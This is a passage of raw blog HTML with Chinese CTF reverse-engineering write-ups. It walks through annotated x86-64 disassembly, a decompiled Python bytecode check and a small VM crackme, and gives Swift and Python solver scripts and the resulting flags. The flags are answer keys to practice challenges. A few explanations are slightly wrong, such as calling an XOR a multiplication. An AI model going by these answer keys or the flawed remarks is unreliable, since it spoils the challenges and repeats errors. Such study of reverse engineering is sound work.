edx</span>,DWORD PTR [rbp<span class="number">-0x4</span>]</span><br><span class="line">  <span class="number">40050</span>a: <span class="type">48 63 ca              movsxd rcx</span>,edx</span><br><span class="line">  <span class="number">40050</span>d: <span class="type">48 8b 55 e8           mov    rdx</span>,QWORD PTR [rbp<span class="number">-0x18</span>]</span><br><span class="line">  <span class="number">400511</span>: <span class="type">48 01 ca              add    rdx</span>,rcx</span><br><span class="line">  <span class="number">400514</span>: <span class="type">0f b6 0a              movzx  ecx</span>,BYTE PTR [rdx]</span><br><span class="line">  <span class="number">400517</span>: <span class="type">8b 55 fc              mov    edx</span>,DWORD PTR [rbp<span class="number">-0x4</span>]</span><br><span class="line">  <span class="number">40051</span>a: <span class="type">31 ca                 xor    edx</span>,ecx</span><br><span class="line">  <span class="number">40051</span>c: <span class="type">88 10                 mov    BYTE PTR </span>[rax],dl</span><br><span class="line">  <span class="number">40051</span>e: <span class="type">83 45 fc 01           add    DWORD PTR </span>[rbp<span class="number">-0x4</span>],<span class="number">0x1</span></span><br><span class="line">  <span class="number">400522</span>: <span class="type">8b 45 fc              mov    eax</span>,DWORD PTR [rbp<span class="number">-0x4</span>]</span><br><span class="line">  <span class="number">400525</span>: <span class="type">3b 45 e4              cmp    eax</span>,DWORD PTR [rbp<span class="number">-0x1c</span>]</span><br><span class="line">  <span class="number">400528</span>: <span class="type">7e d0                 jle    4004fa </span>&lt;func+<span class="number">0x14</span>&gt;</span><br><span class="line">  <span class="number">40052</span>a: <span class="type">90                    nop</span></span><br><span class="line"><span class="type">  40052b</span>: <span class="number">5</span>d                    pop    rbp</span><br><span class="line">  <span class="number">40052</span>c: <span class="type">c3                    ret</span></span><br></pre></td></tr></table></figure>

<p>分析过程记录：</p>
<h4 id="（1）main-部分"><a href="#（1）main-部分" class="headerlink" title="（1）main() 部分"></a>（1）main() 部分</h4><p><code>0x</code> 表示十六进制。<br>flag 是对此 input 数组的操作组合而成。</p>
<p><a href="http://www.bluesock.org/~willg/dev/ascii.html" target="_blank" rel="noopener">http://www.bluesock.org/~willg/dev/ascii.html</a></p>
<h4 id="（2）函数调用部分"><a href="#（2）函数调用部分" class="headerlink" title="（2）函数调用部分"></a>（2）函数调用部分</h4><p><strong>4004e6</strong>：表示该指令对应的虚拟内存地址<br><strong>55</strong>：该指令对应的计算机指令</p>
<p>函数调用过程：</p>
<blockquote>
<p>入栈，将寄存器的值压入调用 bp 栈中<br>建立新栈帧，别掉函数栈帧栈底地址放入寄存器</p>
</blockquote>
<p>实现</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push   rbp</span><br><span class="line">mov    rbp,rsp</span><br></pre></td></tr></table></figure>

<p>寄存器类型：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ax(accumulator): 可用于存放函数返回值</span><br><span class="line">bp(base pointer): 用于存放执行中的函数对应的栈帧的栈底地址</span><br><span class="line">sp(stack poinger): 用于存放执行中的函数对应的栈帧的栈顶地址</span><br><span class="line">ip(instruction pointer): 指向当前执行指令的下一条指令</span><br></pre></td></tr></table></figure>

<p>前缀加上 r 表示 64 位， e 表示 32 位，使用时表示该寄存器存储 xx 位的数据。</p>
<h4 id="（3）执行过程"><a href="#（3）执行过程" class="headerlink" title="（3）执行过程"></a>（3）执行过程</h4><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000004004e6</span> &lt;func&gt;:<span class="type"></span></span><br><span class="line"><span class="type">  4004e6</span>: <span class="number">55</span>                    push   rbp                         <span class="comment">/*函数调用</span></span><br><span class="line"><span class="comment">  4004e7: 48 89 e5              mov    rbp,rsp                              */</span></span><br><span class="line">  <span class="number">4004</span>ea: <span class="type">48 89 7d e8           mov    QWORD PTR </span>[rbp<span class="number">-0x18</span>],rdi       <span class="comment">//rdi 存第一个参数</span></span><br><span class="line">  <span class="number">4004</span>ee: <span class="type">89 75 e4              mov    DWORD PTR </span>[rbp<span class="number">-0x1c</span>],esi       <span class="comment">//esi 存第二个参数</span></span><br><span class="line">  <span class="number">4004</span>f1: <span class="type">c7 45 fc 01 00 00 00  mov    DWORD PTR </span>[rbp<span class="number">-0x4</span>],<span class="number">0x1</span>        <span class="comment">//在[rbp-0x4]写入 0x1</span></span><br><span class="line">  <span class="number">4004</span>f8: <span class="type">eb 28                 jmp    400522 </span>&lt;func+<span class="number">0x3c</span>&gt;</span><br><span class="line">  <span class="number">4004</span>fa: <span class="type">8b 45 fc              mov    eax</span>,DWORD PTR [rbp<span class="number">-0x4</span>]         <span class="comment">//把[rbp-0x4]的值送入 eax ,即 eax = 1</span></span><br><span class="line">  <span class="number">4004</span>fd: <span class="type">48 63 d0              movsxd rdx</span>,eax                         <span class="comment">//扩展,传送 rdx=1</span></span><br><span class="line">  <span class="number">400500</span>: <span class="type">48 8b 45 e8           mov    rax</span>,QWORD PTR [rbp<span class="number">-0x18</span>]        <span class="comment">//第一个参数 [rbp-0x18]，rax=input[0]</span></span><br><span class="line">  <span class="number">400504</span>: <span class="type">48 01 d0              add    rax</span>,rdx                         <span class="comment">//rax = input[1]</span></span><br><span class="line">  <span class="number">400507</span>: <span class="type">8b 55 fc              mov    edx</span>,DWORD PTR [rbp<span class="number">-0x4</span>]         <span class="comment">//第 6 行中存储的 0x1 ,传入 edx ,即 edx =1</span></span><br><span class="line">  <span class="number">40050</span>a: <span class="type">48 63 ca              movsxd rcx</span>,edx                          <span class="comment">//rcx=1</span></span><br><span class="line">  <span class="number">40050</span>d: <span class="type">48 8b 55 e8           mov    rdx</span>,QWORD PTR [rbp<span class="number">-0x18</span>]         <span class="comment">// rdx = input[0]</span></span><br><span class="line">  <span class="number">400511</span>: <span class="type">48 01 ca              add    rdx</span>,rcx                          <span class="comment">//rdx += rcx ,rdx = input[1]</span></span><br><span class="line">  <span class="number">400514</span>: <span class="type">0f b6 0a              movzx  ecx</span>,BYTE PTR [rdx]               <span class="comment">//ecx = input[1]</span></span><br><span class="line">  <span class="number">400517</span>: <span class="type">8b 55 fc              mov    edx</span>,DWORD PTR [rbp<span class="number">-0x4</span>]          <span class="comment">//edx = 0x1 </span></span><br><span class="line">  <span class="number">40051</span>a: <span class="type">31 ca                 xor    edx</span>,ecx                          <span class="comment">//edx ^= ecx ,原先 ecx 为 1100111，edx 为 0000001，操作后 edx 为 1100110，即 f</span></span><br><span class="line">  <span class="number">40051</span>c: <span class="type">88 10                 mov    BYTE PTR </span>[rax],dl                <span class="comment">//rax = dl</span></span><br><span class="line">  <span class="number">40051</span>e: <span class="type">83 45 fc 01           add    DWORD PTR </span>[rbp<span class="number">-0x4</span>],<span class="number">0x1</span>          <span class="comment">//[rbp-0x4]处为 0x1</span></span><br><span class="line">  <span class="number">400522</span>: <span class="type">8b 45 fc              mov    eax</span>,DWORD PTR [rbp<span class="number">-0x4</span>]          <span class="comment">//把[rbp-0x4]的值送入 eax，eax=1</span></span><br><span class="line">  <span class="number">400525</span>: <span class="type">3b 45 e4              cmp    eax</span>,DWORD PTR [rbp<span class="number">-0x1c</span>]         <span class="comment">// 比较操作，将[rbp-0x1c] 处的值与eax比较，改变状态位，eax=28时，ZF=1，否则ZF=0</span></span><br><span class="line">  <span class="number">400528</span>: <span class="type">7e d0                 jle    4004fa </span>&lt;func+<span class="number">0x14</span>&gt;               <span class="comment">//eax &lt; 28 时跳转至 4004fa   func(input, 28); ZF=1时跳出</span></span><br><span class="line">  <span class="number">40052</span>a: <span class="type">90                    nop</span></span><br><span class="line"><span class="type">  40052b</span>: <span class="number">5</span>d                    pop    rbp</span><br><span class="line">  <span class="number">40052</span>c: <span class="type">c3                    ret</span></span><br></pre></td></tr></table></figure>

<ul>
<li>-word 表示字<br>q 四字 d 双字<br>dword qword</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dword 2*16 =32 位</span><br><span class="line">qword 4*16 = 64 位</span><br></pre></td></tr></table></figure>

<ul>
<li>PTR 指针（pointer）<br>没有寄存器名时， X ptr 指明内存单元的长度，X 在汇编指令中可以为word 或 byte 。</li>
<li>内存地址</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[rbp-0x18]</span><br></pre></td></tr></table></figure>

<ul>
<li>涉及指令</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1.movsxd 指令为扩展至零</span><br><span class="line">将32位的寄存器和内存操作数符号扩展到64位的寄存器</span><br><span class="line">2.逻辑异或运算指令 XOR </span><br><span class="line">XOR OPRD1,OPRD2 </span><br><span class="line">实现两个操作数按位‘异或’(异为真,相同为假)运算,结果送至目的操作数中.</span><br><span class="line">OPRD1&lt;--OPRD1 XOR OPRD2</span><br><span class="line">3.JLE</span><br><span class="line"> 小于等于时转移</span><br></pre></td></tr></table></figure>

<p>操作行为链：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rdx——rax</span><br><span class="line">edx——rcx</span><br><span class="line">rcx——rdx 作为累加</span><br></pre></td></tr></table></figure>

<p>简单来说就是input[i]*i，最后用ASCII码输出</p>
<p>我们来用Swift语言实现</p>
<figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> UIKit;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">var</span> inputs:[<span class="type">Int</span>] = [<span class="number">0x67</span>, <span class="number">0x6e</span>, <span class="number">0x62</span>, <span class="number">0x63</span>, <span class="number">0x7e</span>, <span class="number">0x74</span>, <span class="number">0x62</span>, <span class="number">0x69</span>, <span class="number">0x6d</span>,<span class="number">0x55</span>, <span class="number">0x6a</span>, <span class="number">0x7f</span>, <span class="number">0x60</span>, <span class="number">0x51</span>, <span class="number">0x66</span>, <span class="number">0x63</span>, <span class="number">0x4e</span>, <span class="number">0x66</span>, <span class="number">0x7b</span>,<span class="number">0x71</span>, <span class="number">0x4a</span>, <span class="number">0x74</span>, <span class="number">0x76</span>, <span class="number">0x6b</span>, <span class="number">0x70</span>, <span class="number">0x79</span>, <span class="number">0x66</span> , <span class="number">0x1c</span>]</span><br><span class="line">    <span class="keyword">var</span> flag = <span class="type">Slove</span>(inputs: inputs,num: <span class="number">28</span>)</span><br><span class="line">    <span class="built_in">print</span>((flag))</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Slove</span><span class="params">(inputs:Array&lt;Int&gt;,num:Int)</span></span>-&gt; <span class="type">String</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">var</span> flag = <span class="string">" "</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="number">1</span>...num</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">var</span> char1 = <span class="type">Character</span>(<span class="type">UnicodeScalar</span>(inputs[i-<span class="number">1</span>]^i)!);</span><br><span class="line">        flag += <span class="type">String</span>(char1);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line">&#125;</span><br><span class="line">main()</span><br></pre></td></tr></table></figure>

<p>还可以使用Python语言来实现</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span><span class="params">(inputs, num)</span>:</span></span><br><span class="line">    flag = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, num):</span><br><span class="line">        flag += chr(inputs[i<span class="number">-1</span>] ^ i)</span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    inputs = [<span class="number">0x67</span>, <span class="number">0x6e</span>, <span class="number">0x62</span>, <span class="number">0x63</span>, <span class="number">0x7e</span>, <span class="number">0x74</span>, <span class="number">0x62</span>, <span class="number">0x69</span>, <span class="number">0x6d</span>,<span class="number">0x55</span>, <span class="number">0x6a</span>, <span class="number">0x7f</span>, <span class="number">0x60</span>, <span class="number">0x51</span>, <span class="number">0x66</span>, <span class="number">0x63</span>, <span class="number">0x4e</span>, <span class="number">0x66</span>, <span class="number">0x7b</span>,<span class="number">0x71</span>, <span class="number">0x4a</span>, <span class="number">0x74</span>, <span class="number">0x76</span>, <span class="number">0x6b</span>, <span class="number">0x70</span>, <span class="number">0x79</span>, <span class="number">0x66</span> , <span class="number">0x1c</span>]</span><br><span class="line">    flag = func(inputs, <span class="number">28</span>)</span><br><span class="line">    <span class="keyword">print</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>可获得Flag：flag{read_asm_is_the_basic}</p>
<h3 id="3-Py交易"><a href="#3-Py交易" class="headerlink" title="3.Py交易"></a>3.Py交易</h3><p>根据题意可知，即为Python逆向题目，打开在线Python反编译应用，推荐：<a href="https://tool.lu/pyc/" target="_blank" rel="noopener">https://tool.lu/pyc/</a></p>
<p>可获得反编译代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span><span class="params">(message)</span>:</span>                        <span class="comment">#def定义了一个encode模块的变量</span></span><br><span class="line">    s = <span class="string">''</span>                                  <span class="comment">#为了存入最后的目标串</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> message:                       <span class="comment">#ord()函数主要用来返回对应字符的ascii码</span></span><br><span class="line">        x = ord(i) ^ <span class="number">32</span>                     <span class="comment">#将输入的字符串中每个字符ascii码都与32进行异或运算</span></span><br><span class="line">        x = x + <span class="number">16</span>                          <span class="comment">#每个都加上16</span></span><br><span class="line">        s += chr(x)                         <span class="comment">#再将它们一个一个转为字符</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(s)              <span class="comment">#最后再将新串进行一次base64加密</span></span><br><span class="line"> </span><br><span class="line">correct = <span class="string">'XlNkVmtUI1MgXWBZXCFeKY+AaXNt'</span>    <span class="comment">#输入的串</span></span><br><span class="line">flag = <span class="string">''</span>                                   <span class="comment">#为了存入最后的目标串</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'Input flag:'</span>                         <span class="comment">#屏幕提示信息 请输入flag</span></span><br><span class="line">flag = raw_input()                          <span class="comment">#获取输入</span></span><br><span class="line"><span class="keyword">if</span> encode(flag) == correct:                 <span class="comment">#如果加密后的flag与correct相同  输出correct</span></span><br><span class="line">                                                            </span><br><span class="line">    <span class="keyword">print</span> <span class="string">'correct'</span> </span><br><span class="line"><span class="keyword">else</span>:                                       <span class="comment">#否则输出wrong</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'wrong'</span></span><br></pre></td></tr></table></figure>

<p>分析代码可知，输入的Flag，要经过每个字符对应的ascii码与32进行异或运算，且加上16，再转换为ascii字符，最后再将新的flag字符串进行一次base64加密，与’XlNkVmtUI1MgXWBZXCFeKY+AaXNt’进行匹配。那么反过来，只要将’XlNkVmtUI1MgXWBZXCFeKY+AaXNt’进行base64解密，每个字符转换为ascii码，减去16，与32进行异或，再输出为字符即可获得flag。</p>
<p>我们用Swift语言进行实现(Swift的Base64我没搞定，有莫名其妙的BUG）</p>
<figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> UIKit</span><br><span class="line"><span class="class"><span class="keyword">extension</span> <span class="title">Character</span>//扩充方法使字符转为<span class="title">ascii</span>码</span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">func</span> <span class="title">toInt</span><span class="params">()</span></span> -&gt; <span class="type">Int</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">var</span> intFromCharacter:<span class="type">Int</span> = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> scalar <span class="keyword">in</span> <span class="type">String</span>(<span class="keyword">self</span>).unicodeScalars</span><br><span class="line">        &#123;</span><br><span class="line">            intFromCharacter = <span class="type">Int</span>(scalar.value)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> intFromCharacter</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">var</span> str:<span class="type">String</span> = <span class="string">"^SdVkT#S ]`Y\\!^)ism"</span></span><br><span class="line">    <span class="keyword">var</span> flag = <span class="string">" "</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> str</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">var</span> num = <span class="type">Character</span>(<span class="type">UnicodeScalar</span>((i.toInt()-<span class="number">16</span>)^<span class="number">32</span>)!)</span><br><span class="line">        flag += <span class="type">String</span>(num)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line">&#125;</span><br><span class="line">main()</span><br></pre></td></tr></table></figure>

<p>也可以使用Python实现</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">correct =<span class="string">'XlNkVmtUI1MgXWBZXCFeKY+AaXNt'</span></span><br><span class="line">s = base64.b64decode(correct)</span><br><span class="line">flag =<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">i = chr((ord(i)<span class="number">-16</span>)^<span class="number">32</span>)</span><br><span class="line">flag += i </span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure>

<p>可获得Flag：nctf{d3c0mpil1n9_PyC}</p>
<h3 id="4、WxyVM"><a href="#4、WxyVM" class="headerlink" title="4、WxyVM"></a>4、WxyVM</h3><p>用Winhex打开以后可以看出来是ELF文件，所以用Ghidra打开,在内存地址为004006e2的地方发现名为FUN_004006e3的函数，通过分析可以得知即为main函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">undefined8 <span class="title">FUN_004006e3</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> sVar1;</span><br><span class="line">  <span class="keyword">bool</span> bVar2;</span><br><span class="line">  <span class="keyword">int</span> local_c;</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"[WxyVM 0.0.1]"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"input your flag:"</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">"%s"</span>,&amp;DAT_00604b80);</span><br><span class="line">  FUN_004005b6();</span><br><span class="line">  sVar1 = <span class="built_in">strlen</span>(&amp;DAT_00604b80);</span><br><span class="line">  bVar2 = sVar1 == <span class="number">0x18</span>;</span><br><span class="line">  local_c = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> (local_c &lt; <span class="number">0x18</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">int</span>)(<span class="keyword">char</span>)(&amp;DAT_00604b80)[(<span class="keyword">long</span>)local_c] != *(<span class="keyword">int</span> *)(&amp;DAT_00601060 + (<span class="keyword">long</span>)local_c * <span class="number">4</span>)) </span><br><span class="line">    &#123;</span><br><span class="line">      bVar2 = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    local_c = local_c + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (bVar2) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"correct"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"wrong"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以经过分析可以判断变换后的flag在601060处。函数的主体还是比较简单的，现在需要对输入之后的4005b6函数进行分析。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">__<span class="function">int64 <span class="title">sub_4005B6</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v0; <span class="comment">// ST04_4</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">char</span> v3; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"> </span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">14999</span>; i += <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = byte_6010C0[i];</span><br><span class="line">    v3 = byte_6010C0[i + <span class="number">2</span>];</span><br><span class="line">    result = v0;</span><br><span class="line">    <span class="keyword">switch</span> ( v0 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1u</span>:</span><br><span class="line">        result = byte_6010C0[i + <span class="number">1</span>];</span><br><span class="line">        *(&amp;byte_604B80 + result) += v3;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2u</span>:</span><br><span class="line">        result = byte_6010C0[i + <span class="number">1</span>];</span><br><span class="line">        *(&amp;byte_604B80 + result) -= v3;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3u</span>:</span><br><span class="line">        result = byte_6010C0[i + <span class="number">1</span>];</span><br><span class="line">        *(&amp;byte_604B80 + result) ^= v3;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4u</span>:</span><br><span class="line">        result = byte_6010C0[i + <span class="number">1</span>];</span><br><span class="line">        *(&amp;byte_604B80 + result) *= v3;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5u</span>:</span><br><span class="line">        result = byte_6010C0[i + <span class="number">1</span>];</span><br><span class="line">        *(&amp;byte_604B80 + result) ^= *(&amp;byte_604B80 + byte_6010C0[i + <span class="number">2</span>]);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>函数是对一个比较长的数组进行操作6010c0处的数组进行操作，一共有15000个数据，每三个为一组，v0决定进行什么操作，v2用来寻址操作，v3作为操作数利用这个函数对已知的数据进行逆运算就能够得到最终的输入结果了。这里要注意对已知数据进行逆向的时候计数的时候也要倒着计数，从14999~0</p>
<h3 id="9-注意！！！"><a href="#9-注意！！！" class="headerlink" title="9.注意！！！"></a>9.注意！！！</h3><blockquote>
<p>再次重申，请不要未经同意便盗用我们的题目，如果有使用的需要，请和我们联系，联系方式已经在notice已经给出.flag{zhaowomen}</p>
</blockquote>
<p>可获得Flag：flag{zhaowomen}</p>

        
      
    </div>

    
    
    
      <footer class="post-footer">
          <div class="post-eof"></div>
        
      </footer>
  </div>
  
  
  
  </article>

    
       <article itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block home">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/09/14/Pro╚δ├┼▒╩╝╟/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="ZERO-A-ONE">
      <meta itemprop="description" content="Resit much,Obey little">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZERO-A-ONE">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
            
            <a href="/2019/09/14/Pro╚δ├┼▒╩╝╟/" class="post-title-link" itemprop="url">菜鸟IdaPro入门笔记</a>
          
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              
                
              

              <time title="Created: 2019-09-14 09:10:52" itemprop="dateCreated datePublished" datetime="2019-09-14T09:10:52-07:00">2019-09-14</time>
            </span>
          
            

            
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
